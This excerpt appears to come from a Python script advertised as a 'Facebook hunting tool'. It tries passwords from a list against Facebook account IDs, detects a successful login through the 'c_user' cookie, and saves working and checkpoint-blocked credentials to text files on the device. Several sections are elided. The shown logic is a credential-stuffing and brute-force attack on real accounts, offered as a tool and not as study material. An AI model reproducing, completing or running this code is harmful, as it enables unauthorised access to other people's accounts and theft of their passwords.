...
print('[\033[1;32m✓\033[1;37m] Welcome to the Facebook hunting tool 🇵🇰 ')
time.sleep(1.5)
print('[\033[1;32m✓\033[1;37m] Welcome to the Facebook hunting tool 🇵🇰 ')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Dz fishing pictures  ')
time.sleep(2)
try:
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [@zzzxow] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                ok+=1
                                print(f'\r\r\033[1;32m [@zzzxow\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                open(f'/sdcard/@zzzxow•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        cp+=1
                                        print(f'\r\r\x1b[38;5;208m [@zzzxow•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/@zzzxow•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
